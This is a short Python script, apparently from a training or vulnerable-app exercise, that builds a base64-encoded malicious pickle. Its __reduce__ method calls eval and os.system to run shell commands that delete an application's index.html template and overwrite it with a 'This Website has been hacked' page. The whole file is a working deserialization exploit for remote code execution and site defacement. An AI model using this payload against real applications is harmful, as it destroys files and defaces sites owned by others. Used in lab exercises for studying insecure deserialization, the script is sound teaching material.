import pickle  # nosec
from base64 import b64encode

PAYLOAD_RESET = (
    "rm -f application/templates/index.html && touch application/templates/index.html"
)
WRITE_PAYLOAD = 'echo "<html><body><center><h1>This Website has been hacked</h1></center/</body></html>" > application/templates/index.html'


class Exploit(object):
    def __reduce__(self):
        exploit_res = (eval, ("os.system('" + PAYLOAD_RESET + "')",))
        exploit_res = (eval, ("os.system('" + WRITE_PAYLOAD + "')",))
        return exploit_res


exploit_code = pickle.dumps(Exploit())  # nosec
encoded_exploit_code = b64encode(exploit_code)
print(encoded_exploit_code)
